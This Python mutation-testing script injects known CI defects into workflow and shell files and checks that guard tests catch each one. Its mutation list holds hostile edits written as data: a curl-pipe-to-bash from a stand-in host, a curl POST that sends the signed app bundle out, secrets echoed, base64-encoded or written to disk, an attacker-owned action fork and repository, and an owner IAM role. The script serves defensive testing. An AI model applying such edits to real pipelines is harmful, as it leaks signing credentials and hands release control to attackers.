#!/usr/bin/env python3
"""Apply known defects to the repository and require the guard suite to catch each.

Four verification rounds of M1 found ~50 defects, and every one of #167-#175 is
the same sentence: *a mutation survived*. Guards were written, believed, and
then shown to be substring checks or scoped to one job. The only thing that
reliably told us so was mutating the code and watching the suite stay green.

So that check stops being something a reviewer does by hand once a round, and
becomes a step CI runs every time.

Each entry below is a defect this project actually shipped or nearly shipped,
with the issue that found it. The battery fails if the suite does NOT go red.

Two rules learned the hard way:

  * A mutation must really change the file. A pattern that no longer matches
    silently tests nothing (#160).
  * A mutation of a YAML file must leave it PARSEABLE. A mutation that breaks
    the syntax makes the guard fail for the wrong reason and reports a false
    pass -- which is exactly what #172 was: `replaceFirst` inserted a literal
    `$1`, the YAML broke, and the battery called it caught.

Usage:  tools/mutation_check.py [--list] [--only SUBSTRING]
Exit:   0 every mutation was caught
        1 at least one survived (the suite stayed green)
        2 the battery could not run (dirty tree, bad pattern, unparseable)
"""
from __future__ import annotations

import argparse
import dataclasses
import pathlib
import re
import subprocess
import sys

ROOT = pathlib.Path(__file__).resolve().parent.parent
SUITE = ["flutter", "test", "--no-pub", "--tags", "guard"]


@dataclasses.dataclass(frozen=True)
class Mutation:
    issue: str
    name: str
    path: str
    apply: object  # str -> str
    why: str
    expect: str = ""
    """A substring of the reason the RIGHT assertion prints when it fires.

    Without this the battery measures "the suite went red", which is not the
    same as "this guard caught it" -- the first version of this file reported
    two mutations as caught when what had actually failed was an unrelated
    test that happens to read the same file. That is the mistake the battery
    exists to find, made by the battery.
    """


def sub(pattern: str, replacement: str, count: int = 1, flags: int = 0):
    """A regex substitution that must match, with the group expansion Dart's
    replaceFirst does NOT do (#172)."""

    def go(text: str) -> str:
        out, n = re.subn(pattern, replacement, text, count=count, flags=flags)
        if n == 0:
            raise LookupError(f"pattern never matched: {pattern!r}")
        return out

    return go


def append(block: str):
    return lambda text: text.rstrip("\n") + "\n" + block


MUTATIONS: list[Mutation] = [
    # ---- the command must run, not merely appear (#167) -------------------
    Mutation("#167", "gate.sh made advisory", ".github/workflows/ci.yml",
             sub(r"run: tools/gate\.sh$", "run: tools/gate.sh || true", flags=re.M),
             "CI would run the gate and ignore its verdict",
             'ci-shape: the gate step must run'),
    Mutation("#167", "invariant-1 scan made advisory", ".github/workflows/release.yml",
             sub(r"run: tools/check_aab\.sh$", "run: tools/check_aab.sh || true", flags=re.M),
             "the permission scan's failure would be discarded on the tag path",
             'release-shape: `scan` must run'),
    Mutation("#167", "certificate check made advisory", ".github/workflows/release.yml",
             sub(r"run: tools/verify_upload_cert\.sh$",
                 "run: tools/verify_upload_cert.sh || true", flags=re.M),
             "a bundle signed with the wrong key would ship",
             'release-shape: `cert` must run'),
    Mutation("#167", "invariant guards made advisory", ".github/workflows/ci.yml",
             sub(r"(run: flutter test --no-pub --tags guard)$", r"\1 || true", flags=re.M),
             "a breached invariant would not fail the PR",
             'ci-shape: the invariant guards'),

    # ---- tracing (#168) ---------------------------------------------------
    Mutation("#168", "workflow-level shell: bash -x", ".github/workflows/release.yml",
             sub(r"^    shell: bash$", "    shell: bash -x", flags=re.M),
             "traces every step in the job holding all five secrets",
             'traces every expanded command'),
    Mutation("#168", "workflow-level shell: bash -x in ci", ".github/workflows/ci.yml",
             sub(r"^    shell: bash$", "    shell: bash -x", flags=re.M),
             "same, on every pull request",
             'traces every expanded command'),

    # ---- scope: a second job (#169) ---------------------------------------
    Mutation("#169", "a second job uploads to production", ".github/workflows/release.yml",
             append("""  publish_prod:
    needs: ship
    runs-on: ubuntu-latest
    steps:
      - id: play2
        uses: r0adkll/upload-google-play@v1
        with:
          serviceAccountJsonPlainText: ${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}
          packageName: com.honestarcade.sudoku
          releaseFiles: build/app/outputs/bundle/release/app-release.aab
          track: production
          status: completed"""),
             "automation reaches production, and the summary still says internal",
             'release-shape: exactly these three jobs'),
    Mutation("#169", "continue-on-error on the gate job", ".github/workflows/release.yml",
             sub(r"^  gate:$", "  gate:\n    continue-on-error: true", flags=re.M),
             "`needs: gate` succeeds on a red gate, so a failing build ships",
             'carries `continue-on-error`'),
    Mutation("#169", "the Play upload becomes conditional", ".github/workflows/release.yml",
             sub(r"(      - id: play\n)", r"\1        if: always()\n"),
             "an earlier failure no longer prevents the upload",
             'release-shape: `if:` or `continue-on-error` on the upload'),
    Mutation("#169", "the upload action is swapped for a fork", ".github/workflows/release.yml",
             sub(r"r0adkll/upload-google-play@v1", "attacker/upload-google-play@v1"),
             "a fork of the action receives the Play credential",
             'release-shape: the upload action must be the pinned one'),
    Mutation("#169", "the package name is changed", ".github/workflows/release.yml",
             sub(r"packageName: com\.honestarcade\.sudoku", "packageName: com.attacker.app"),
             "the bundle is uploaded against someone else's listing",
             'release-shape: the upload must name THIS package'),

    # ---- triggers (#170) --------------------------------------------------
    # ---- #190: the leak shapes #176 listed and did not close ---------------
    Mutation("#190", "a secret is written to a file under HOME", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "$KEYSTORE_PASS" > "$HOME/leak.txt"\n'),
             "a secret on disk is leaked as surely as one printed",
             'reached file'),
    Mutation("#190", "a partial secret, first 8 characters", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1echo "pw8: ${KEYSTORE_PASS:0:8}"\n'),
             "eight characters of a password narrows a search enormously",
             'first 8 characters'),
    Mutation("#190", "a base64-transformed secret", "tools/set_ci_secrets.sh",
             sub(r'(KEY_ALIAS="\$\(read_credential HS_KEY_ALIAS\)"\n)',
                 r'\1printf %s "$KEYSTORE_PASS" | base64\n'),
             "a literal scan is defeated by any encoding, trivially reversible",
             'base64'),
    Mutation("#190", "the password moves onto keytool's argv", "tools/set_ci_secrets.sh",
             sub(r"-storepass:env HS_PASS_PROBE", '-storepass "$KEYSTORE_PASS"'),
             "the password becomes readable from the process table by anything on the machine",
             'command line'),
    Mutation("#190", "make_upload_key.sh prints the password", "tools/make_upload_key.sh",
             sub(r'(chmod 600 "\$KEYSTORE"\n)', r'\1echo "pw: $HS_KEYSTORE_PASS"\n'),
             "the only script holding the plaintext password was outside the leak group",
             'reached stdout'),
    # ---- #182: the upload rule applied to every file, and step sets -------
    Mutation("#182", "a Play upload added to ci.yml", ".github/workflows/ci.yml",
             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
                 r"\1\n      - id: exfil\n        uses: r0adkll/upload-google-play@v1\n"
                 "        with:\n          serviceAccountJsonPlainText: x\n          track: production\n"),
             "ci.yml is workflow_called with secrets: inherit, so this uploads with the real key on a tag",
             'upload-scope:'),
    Mutation("#182", "an extra step in the ci gate job", ".github/workflows/ci.yml",
             sub(r"(      - id: gate\n        name: Quality gate\n        run: tools/gate\.sh\n)",
                 r"\1\n      - id: extra\n        run: curl -sSL https://example.test/x | bash\n"),
             "an added step in the gate job runs with whatever secrets the caller inherited",
             'ci-shape: exactly these steps'),
    Mutation("#182", "a step between play and summary curls the bundle out", ".github/workflows/release.yml",
             sub(r"^      - id: summary$",
                 "      - id: exfil\n        run: curl -X POST --data-binary @app.aab https://example.test/x\n      - id: summary", flags=re.M),
             "the signed bundle leaves the runner after the upload and before the summary",
             'release-shape: exactly these steps'),
    Mutation("#182", "ship moves to a self-hosted runner", ".github/workflows/release.yml",
             sub(r"^    runs-on: ubuntu-latest$", "    runs-on: attacker-self-hosted", 1, re.M),
             "a self-hosted runner sees every secret this workflow holds",
             'runs on `attacker-self-hosted`'),
    # ---- #189: the merge gate, and three tracing variants -----------------
    Mutation("#189", "if: false on the ci gate job", ".github/workflows/ci.yml",
             sub(r"^  gate:\n    runs-on: ubuntu-latest$",
                 "  gate:\n    if: false\n    runs-on: ubuntu-latest", flags=re.M),
             "the entire merge gate is skipped, and a skipped required check does not block a merge",
             'A skipped job reports as skipped'),
    Mutation("#189", "|| true on the keystore alias check", ".github/workflows/release.yml",
             sub(r'-alias "\$HS_KEY_ALIAS" > /dev/null$',
                 '-alias "$HS_KEY_ALIAS" > /dev/null || true', flags=re.M),
             "a keystore whose alias is not the configured one passes the check meant to catch it",
             'discards the exit status'),
    Mutation("#189", "shell: bash -o xtrace, the long form", ".github/workflows/release.yml",
             sub(r"^defaults:\n  run:\n    shell: bash$",
                 "defaults:\n  run:\n    shell: bash -o xtrace", flags=re.M),
             "every step of the job holding five secrets is traced",
             'secrets:'),
    Mutation("#189", "SHELLOPTS: xtrace in the ship env", ".github/workflows/release.yml",
             sub(r'^      FLUTTER_SUPPRESS_ANALYTICS: "true"$',
                 '      FLUTTER_SUPPRESS_ANALYTICS: "true"\n      SHELLOPTS: xtrace', flags=re.M),
             "bash reads SHELLOPTS at startup, so every step of the job is traced",
             'secrets:'),
    Mutation("#170", "pull_request_target added", ".github/workflows/ci.yml",
             sub(r"^  pull_request:$", "  pull_request:\n  pull_request_target:", flags=re.M),
             "fork code runs with the base repo's secrets and a write token",
             'ci-shape: exactly these triggers'),
    Mutation("#170", "the release trigger becomes a branch", ".github/workflows/release.yml",
             sub(r"    tags:\n      - 'v\*'\n", "    branches:\n      - main\n"),
             "every merge to main would ship to Play",
             'release-shape: only a version tag ships'),

    # ---- the promote refusal (#171) ---------------------------------------
    Mutation("#171", "the refusal is commented out", ".github/workflows/play-promote.yml",
             sub(r"^(\s*)exit 1$", r"\1: # exit 1", count=0, flags=re.M),
             "the step still mentions exit 1 and production, and refuses nothing",
             'was ACCEPTED by the refusal step'),
    Mutation("#171", "a later step becomes unconditional",
             ".github/workflows/play-promote.yml",
             sub(r"(      - id: promote\n)", r"\1        if: always()\n"),
             "the promotion runs even when the refusal failed",
             'so it can run although the refusal failed'),
    Mutation("#171", "a second job with no refusal", ".github/workflows/play-promote.yml",
             append("""  sneaky:
    runs-on: ubuntu-latest
    steps:
      - id: token
        run: gcloud auth activate-service-account --key-file k.json
      - id: promote
        run: tools/play_promote.sh com.honestarcade.sudoku internal production"""),
             "a job with no refusal mints the credential and promotes",
             'not the dispatch input'),

    # ---- play-api-check's keystore step (#173) ----------------------------
    # Was "the alias assertion is disabled", replacing `if [ "$alias_got" !=
    # "$alias_want" ]` with `if false`. #180 deleted that block as dead code:
    # with `-alias`, keytool echoes back the REQUESTED spelling, so the
    # comparison could never fire. The battery reported BROKEN rather than
    # passing over the missing pattern, which is the verdict it exists for.
    #
    # The defect the old entry stood for is still real, and this is the
    # spelling of it that survives: without `-alias`, keytool lists the whole
    # keystore, the step reads the FIRST entry, and a multi-entry keystore
    # whose first alias is not the configured one passes here and fails in
    # release.yml (#165).
    Mutation("#173", "keytool -list loses its -alias", ".github/workflows/play-api-check.yml",
             sub(r' -alias "\$HS_KEY_ALIAS" > "\$listing"', ' > "$listing"'),
             "the alias check asks about the whole keystore, not the configured entry",
             'keytool -list is asked for the configured alias'),
    Mutation("#173", "the fingerprint comparison is dropped",
             ".github/workflows/play-api-check.yml",
             sub(r'if \[ "\$bundle_fp" != "\$pem_fp" \]; then', "if false; then"),
             "the uploaded keystore need not match the committed certificate",
             'a keystore that is not the committed certificate is refused'),
    Mutation("#173", "the tracks grep loses its || true",
             ".github/workflows/play-api-check.yml",
             sub(r"\{ grep -oE '\"track\":\"\[a-z\]\+\"' \|\| true; \}",
                 "grep -oE '\"track\":\"[a-z]+\"'"),
             "a brand-new app with no tracks fails the check it must pass",
             'empty-tracks'),

    # ---- the keypass equality (#174) --------------------------------------
    Mutation("#174", "the keypass check is deleted", ".github/workflows/release.yml",
             sub(r'          if \[ "\$HS_KEY_PASS" != "\$HS_KEYSTORE_PASS" \]; then.*?\n          fi\n',
                 "", flags=re.S),
             "a mismatch reaches the four-minute Gradle build again",
             'differing passwords are refused before the build'),
    Mutation("#174", "the keypass check is inverted", ".github/workflows/release.yml",
             sub(r'if \[ "\$HS_KEY_PASS" != "\$HS_KEYSTORE_PASS" \]; then',
                 'if [ "$HS_KEY_PASS" = "$HS_KEYSTORE_PASS" ]; then'),
             "every correct release fails",
             'matching passwords pass'),

    # ---- the unconverted rules (#175) -------------------------------------
    Mutation("#175", "an unpinned action in flow style", ".github/workflows/release.yml",
             # Appended after the last step, not before the first: inserting it at
             # the front changes `ids.first` and the shape assertion fires for a
             # reason that has nothing to do with pinning.
             sub(r"(      - id: shred\n(?:.*\n)*?        run: [^\n]*\n)",
                 r"\1      - {uses: attacker/action}\n"),
             "an unpinned third party inside the merge gate",
             'every action is pinned'),
    Mutation("#175", "write-all permissions, quoted", ".github/workflows/release.yml",
             sub(r"^permissions:\n  contents: read$",
                 "permissions: 'write-all'", flags=re.M),
             "the job gets every scope",
             'declares its permissions'),

    # ---- the scripts ------------------------------------------------------
    Mutation("#176", "the password is printed", "tools/set_ci_secrets.sh",
             sub(r'(echo "set: HS_KEYSTORE_B64)', r'echo "pw: $KEY_PASS"\n\1'),
             "the keystore password reaches stdout",
             'leak:'),
    Mutation("#176", "the private key is printed", "tools/setup_play_ci.sh",
             sub(r'(  gh secret set "\$SECRET")', r'  cat "$KEY_PATH"\n\1'),
             "the service-account private key reaches stdout",
             'leak:'),
    Mutation("#176", "secrets go to another repository", "tools/set_ci_secrets.sh",
             sub(r'REPO="honestarcade/HonestSudoku"', 'REPO="attacker/Evil"'),
             "the real keystore is uploaded to someone else's repository",
             'destination:'),
    Mutation("#176", "the key survives a failed upload", "tools/setup_play_ci.sh",
             sub(r"^  trap cleanup_key EXIT INT TERM$", "  : # trap removed", flags=re.M),
             "a live private key is left on disk and the next run mints another",
             'setup-fail:'),
    Mutation("#176", "an IAM role is granted", "tools/setup_play_ci.sh",
             sub(r"(    --display-name \"Honest Sudoku CI\" \\\n)",
                 r"\1    --role roles/owner \\\n"),
             "the service account gets authority nobody needs",
             'iam:'),
    Mutation("#178", "a negative version code is accepted", "tools/play_release_codes.py",
             sub(r'r"\[0-9\]\+"', 'r"-?[0-9]+"'),
             "a negative code is promoted as a version code",
             'negative'),
    Mutation("#159", "the newline guard is removed", "tools/ci_version.sh",
             sub(r'has_newline "\$run" && die "run number contains a newline"\n', ""),
             "a newline in the run number is accepted again",
             'newline was accepted'),
    Mutation("#119", "the credentials file is written by a heredoc",
             "tools/make_upload_key.sh",
             sub(r"escape_for_double_quotes \"\$HS_KEYSTORE_PASS\"", '$HS_KEYSTORE_PASS'),
             "a password containing $( ) executes and is recorded wrong",
             # The leak scan added for #190 now fires first, inside the same
             # round-trip test: an unescaped password partially reaches
             # stderr. Earlier and more specific than the old marker.
             'survives the round trip'),
]


def run(cmd: list[str], **kw) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, **kw)


def parses_as_yaml(path: pathlib.Path) -> bool:
    """A YAML mutation that breaks the syntax proves nothing (#172)."""
    if path.suffix not in {".yml", ".yaml"}:
        return True
    probe = run([
        "python3", "-c",
        "import sys\n"
        "try:\n"
        "    import yaml\n"
        "except ImportError:\n"
        "    sys.exit(3)\n"
        "yaml.safe_load(open(sys.argv[1]))\n",
        str(path),
    ])
    if probe.returncode == 3:
        return True  # no PyYAML here; the Dart guard will report a parse failure
    return probe.returncode == 0


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--only", default="")
    args = ap.parse_args()

    selected = [m for m in MUTATIONS if args.only.lower() in
                f"{m.issue} {m.name} {m.path}".lower()]

    if args.list:
        for m in selected:
            print(f"{m.issue:<7} {m.path:<42} {m.name}")
        print(f"\n{len(selected)} mutations")
        return 0

    dirty = run(["git", "status", "--porcelain"]).stdout.strip()
    if dirty:
        print("mutation_check: refusing to run with uncommitted changes:", file=sys.stderr)
        print(dirty, file=sys.stderr)
        return 2

    print(f"mutation_check: {len(selected)} mutations\n")
    survived: list[Mutation] = []
    wrong: list[Mutation] = []
    broken: list[tuple[Mutation, str]] = []

    for i, m in enumerate(selected, 1):
        target = ROOT / m.path
        original = target.read_text()
        label = f"[{i}/{len(selected)}] {m.issue} {m.name}"
        try:
            mutated = m.apply(original)
        except LookupError as exc:
            broken.append((m, str(exc)))
            print(f"  BROKEN  {label}\n          {exc}")
            continue
        if mutated == original:
            broken.append((m, "changed nothing"))
            print(f"  BROKEN  {label}\n          changed nothing")
            continue

        target.write_text(mutated)
        try:
            if not parses_as_yaml(target):
                broken.append((m, "left the file unparseable — it would fail for the wrong reason"))
                print(f"  BROKEN  {label}\n          unparseable after mutation")
                continue
            result = run(SUITE)
            output = result.stdout + result.stderr
            if result.returncode == 0:
                # Re-run before reporting a survivor. A SURVIVED verdict is
                # the one that matters — it says a guard has a hole — and one
                # flaky green would announce a hole that is not there, or
                # worse, be dismissed as flake when it is real. A second
                # green costs one suite run on the rare path only (#192).
                confirm = run(SUITE)
                if confirm.returncode != 0:
                    output = confirm.stdout + confirm.stderr
                    print(f"  (first run of {label} was green, second was not "
                          f"— reporting the second)")
                else:
                    survived.append(m)
                    print(f"  SURVIVED {label}\n           {m.why}")
            if result.returncode == 0 and m not in survived:
                # Fell through from the flaky branch above; judged on the
                # confirming run's output.
                if m.expect and m.expect not in output:
                    wrong.append(m)
                    print(f"  WRONG-REASON {label}\n               the suite "
                          f"failed, but not with {m.expect!r}")
                else:
                    print(f"  caught  {label}")
            elif result.returncode == 0:
                pass
            elif m.expect and m.expect not in output:
                # Red, but not for this reason. Counting it as caught is how a
                # guard gets credit for an assertion it does not make.
                wrong.append(m)
                print(f"  WRONG-REASON {label}\n               the suite failed, "
                      f"but not with {m.expect!r}")
            else:
                print(f"  caught  {label}")
        finally:
            target.write_text(original)

    print()
    if broken:
        print(f"{len(broken)} mutation(s) could not be applied — the battery is "
              f"testing less than it claims:", file=sys.stderr)
        for m, why in broken:
            print(f"  {m.issue} {m.name}: {why}", file=sys.stderr)
    if wrong:
        print(f"{len(wrong)} mutation(s) failed the suite for the WRONG REASON — "
              f"the named assertion did not fire:", file=sys.stderr)
        for m in wrong:
            print(f"  {m.issue} {m.path}: {m.name} (expected {m.expect!r})",
                  file=sys.stderr)
    if survived:
        print(f"{len(survived)} mutation(s) SURVIVED — the guards do not catch them:",
              file=sys.stderr)
        for m in survived:
            print(f"  {m.issue} {m.path}: {m.name}", file=sys.stderr)
    if broken or survived or wrong:
        return 1 if (survived or wrong) else 2
    print(f"all {len(selected)} mutations caught")
    return 0


if __name__ == "__main__":
    sys.exit(main())
